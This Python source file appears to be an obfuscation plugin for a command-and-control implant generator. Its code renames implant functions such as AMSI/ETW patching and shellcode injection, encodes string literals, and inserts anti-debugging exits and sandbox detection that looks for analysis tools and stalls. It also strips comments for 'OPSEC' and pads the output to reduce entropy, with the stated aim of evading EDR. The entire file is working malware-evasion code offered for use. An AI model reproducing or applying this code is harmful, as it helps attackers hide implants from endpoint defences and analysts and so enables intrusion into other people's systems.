"""Default polymorphic obfuscation — extracted from agent.py obfuscate_strings().

Applies: function/variable/import renaming, string encoding, junk code,
anti-debugging, sandbox detection, comment stripping, entropy reduction.
"""

import math
import random
import re

OBFUSCATOR = {
    "name": "default",
    "description": "Standard polymorphic obfuscation with EDR evasion",
    "languages": ["python"],
    "order": 10,
}


# ---------------------------------------------------------------------------
# Helpers (extracted from AgentGenerator)
# ---------------------------------------------------------------------------

def _calculate_shannon_entropy(data: str) -> float:
    """Calculate Shannon entropy of data (EDR evasion metric)."""
    if not data:
        return 0.0
    entropy = 0.0
    byte_counts = {}
    for byte in data.encode():
        byte_counts[byte] = byte_counts.get(byte, 0) + 1
    data_len = len(data.encode())
    for count in byte_counts.values():
        probability = count / data_len
        entropy -= probability * math.log2(probability)
    return entropy


def _reduce_entropy(content: str, patterns) -> str:
    """Reduce Shannon entropy to evade EDR detection (EK47 technique).

    Normal code entropy: ~4.5-6.5
    Encrypted/obfuscated code: ~7.5-8.0
    Target: Keep below 7.0 to appear as normal code.
    """
    current_entropy = _calculate_shannon_entropy(content)
    if current_entropy < 6.8:
        return content

    padding_words = patterns.padding_words
    padding_vars = []
    for _ in range(random.randint(10, 20)):
        var_name = random.choice(padding_words) + '_' + random.choice(padding_words)
        value = random.choice([
            f'"{random.choice(padding_words)}"',
            str(random.randint(0, 100)),
            'None',
            'True',
            'False',
        ])
        padding_vars.append(f'{var_name} = {value}')

    lines = content.split('\n')
    insert_point = 5
    for padding in padding_vars:
        lines.insert(insert_point, padding)
        insert_point += 1

    content = '\n'.join(lines)
    return content


def _strip_comments_and_docstrings(content: str) -> str:
    """Remove all comments and docstrings for OPSEC."""
    lines = content.split('\n')
    cleaned_lines = []
    in_multiline_string = False
    multiline_char = None

    for line in lines:
        stripped = line.lstrip()

        # Skip shebang
        if stripped.startswith('#!'):
            cleaned_lines.append(line)
            continue

        # Handle multiline strings (docstrings)
        if '"""' in stripped or "'''" in stripped:
            triple_double = stripped.count('"""')
            triple_single = stripped.count("'''")

            if triple_double > 0:
                if triple_double % 2 == 1:
                    in_multiline_string = not in_multiline_string
                    multiline_char = '"'
                if in_multiline_string or (triple_double >= 2 and not line.strip().startswith('"""')):
                    continue
                if triple_double >= 2:
                    continue

            if triple_single > 0:
                if triple_single % 2 == 1:
                    in_multiline_string = not in_multiline_string
                    multiline_char = "'"
                if in_multiline_string or (triple_single >= 2 and not line.strip().startswith("'''")):
                    continue
                if triple_single >= 2:
                    continue

        # Skip lines inside multiline strings
        if in_multiline_string:
            continue

        # Remove inline comments (but preserve strings with #)
        if '#' in line:
            in_string = False
            string_char = None
            new_line = []
            for i, char in enumerate(line):
                if char in ['"', "'"] and (i == 0 or line[i - 1] != '\\'):
                    if not in_string:
                        in_string = True
                        string_char = char
                    elif char == string_char:
                        in_string = False
                        string_char = None
                if char == '#' and not in_string:
                    break
                new_line.append(char)
            line = ''.join(new_line).rstrip()

        if line.strip():
            cleaned_lines.append(line)

    return '\n'.join(cleaned_lines)


# ---------------------------------------------------------------------------
# Main obfuscation entry point
# ---------------------------------------------------------------------------

def obfuscate(content: str, lang: str, config) -> str:
    """Apply standard polymorphic obfuscation (mirrors agent.py obfuscate_strings)."""
    if lang != "python":
        return content

    from patterns import PatternProvider

    pattern_name = getattr(config, 'patterns', 'default') if config else 'default'
    patterns = PatternProvider(pattern_name)

    # --- Function name randomization ---
    func_mappings = {
        'execute_command': patterns.random_var_name(),
        'get_metadata': patterns.random_var_name(),
        'simple_encrypt': patterns.random_var_name(),
        'simple_decrypt': patterns.random_var_name(),
        'connect_to_server': patterns.random_var_name(),
        'socks_proxy_handler': patterns.random_var_name(),
        'heartbeat': patterns.random_var_name(),
        'calculate_sleep_time': patterns.random_var_name(),
        'patch_amsi': patterns.random_var_name(),
        'patch_etw': patterns.random_var_name(),
        'SyscallResolver': patterns.random_var_name(),
        'inject_shellcode': patterns.random_var_name(),
        'obfuscated_sleep': patterns.random_var_name(),
        'find_target_process': patterns.random_var_name(),
        'get_image_regions': patterns.random_var_name(),
        'StreamingSleepObfuscator': patterns.random_var_name(),
    }

    func_pattern = re.compile(
        r'\b(' + '|'.join(re.escape(k) for k in func_mappings) + r')\b'
    )
    content = func_pattern.sub(lambda m: func_mappings[m.group(0)], content)

    # --- Variable name randomization ---
    var_replacements = {
        'metadata': patterns.random_var_name(),
        'message': patterns.random_var_name(),
        'command': patterns.random_var_name(),
        'output': patterns.random_var_name(),
        'encrypted': patterns.random_var_name(),
        'decrypted': patterns.random_var_name(),
        'websocket': patterns.random_var_name(),
        'syscall_resolver': patterns.random_var_name(),
        'image_regions': patterns.random_var_name(),
        'watcher_thread': patterns.random_var_name(),
        'wake_event': patterns.random_var_name(),
    }
    var_pattern = re.compile(
        r'\b(' + '|'.join(re.escape(k) for k in var_replacements) + r')\b(?=\s*[=:]|[\s\.])'
    )
    content = var_pattern.sub(lambda m: var_replacements[m.group(1)], content)

    # --- Import alias randomization (EDR evasion) ---
    import_aliases = {
        'websockets': patterns.random_var_name(),
        'subprocess': patterns.random_var_name(),
        'platform': patterns.random_var_name(),
        'getpass': patterns.random_var_name(),
    }
    for original, alias in import_aliases.items():
        content = re.sub(
            rf'^(import {original})\s*$',
            rf'import {original} as {alias}',
            content,
            flags=re.MULTILINE,
        )
        content = re.sub(rf'\b{original}\.', f'{alias}.', content)

    # --- String literal obfuscation (EDR evasion) ---
    strings_to_obfuscate = [
        ('register', 'type'),
        ('checkin', 'type'),
        ('command', 'type'),
        ('response', 'type'),
        ('heartbeat', 'type'),
    ]

    import base64 as _b64

    for string_val, context in strings_to_obfuscate:
        if context == 'type':
            encoding_type = random.choice(patterns.string_encodings)

            if encoding_type == 'base64':
                encoded = _b64.b64encode(string_val.encode()).decode()
                replacement = f"__import__('base64').b64decode('{encoded}').decode()"
            elif encoding_type == 'hex':
                encoded = string_val.encode().hex()
                replacement = f"bytes.fromhex('{encoded}').decode()"
            elif encoding_type == 'reverse':
                reversed_str = string_val[::-1]
                replacement = f"'{reversed_str}'[::-1]"
            elif encoding_type == 'xor':
                key = random.randint(1, 255)
                xored = ''.join([chr(ord(c) ^ key) for c in string_val])
                encoded = _b64.b64encode(xored.encode()).decode()
                replacement = (
                    f"''.join([chr(ord(c)^{key}) for c in "
                    f"__import__('base64').b64decode('{encoded}').decode()])"
                )
            else:
                # Fallback to hex
                encoded = string_val.encode().hex()
                replacement = f"bytes.fromhex('{encoded}').decode()"

            content = content.replace(f"'{string_val}'", replacement)

    # --- Junk code insertion ---
    lines = content.split('\n')
    safe_positions = []

    for i, line in enumerate(lines):
        if i > 20 and i < len(lines) - 20:
            if line.startswith('def ') or line.startswith('async def '):
                safe_positions.append(i)

    num_insertions = min(2, len(safe_positions))
    if safe_positions and num_insertions > 0:
        insert_positions = random.sample(safe_positions, num_insertions)
        for pos in sorted(insert_positions, reverse=True):
            junk = f"{patterns.random_var_name()} = {random.randint(0, 1000)}"
            lines.insert(pos, junk)

    content = '\n'.join(lines)

    # --- Anti-debugging checks (EDR evasion) ---
    check_func = patterns.random_var_name()
    anti_debug = f'''
def {check_func}():
    import sys as _sys_check
    if hasattr(_sys_check, 'gettrace') and _sys_check.gettrace() is not None:
        _sys_check.exit(1)
    return True

{check_func}()
'''
    content = content.replace(
        '#!/usr/bin/env python3',
        '#!/usr/bin/env python3\n' + anti_debug,
    )

    # --- Sandbox/VM detection ---
    env_func = patterns.random_var_name()
    delay_var = patterns.random_var_name()
    sandbox_check = f'''
def {env_func}():
    import os as _os_env
    import time as _time_env
    {delay_var} = 0
    try:
        cpu_count = _os_env.cpu_count() or 1
        if cpu_count < 2:
            {delay_var} += 30
    except Exception:
        pass
    try:
        known_procs = ['vmsrvc', 'vmusrvc', 'vboxtray', 'vmtoolsd', 'wireshark', 'procmon', 'x64dbg', 'ollydbg', 'ida']
        if hasattr(_os_env, 'popen'):
            ps_out = _os_env.popen('tasklist 2>nul || ps aux 2>/dev/null').read().lower()
            for proc in known_procs:
                if proc in ps_out:
                    {delay_var} += 15
                    break
    except Exception:
        pass
    if {delay_var} > 0:
        _time_env.sleep({delay_var})

{env_func}()
'''
    content = content.replace(
        '#!/usr/bin/env python3',
        '#!/usr/bin/env python3\n' + sandbox_check,
    )

    # --- Strip comments and docstrings ---
    content = _strip_comments_and_docstrings(content)

    # --- Entropy reduction (EK47 technique) ---
    content = _reduce_entropy(content, patterns)

    return content
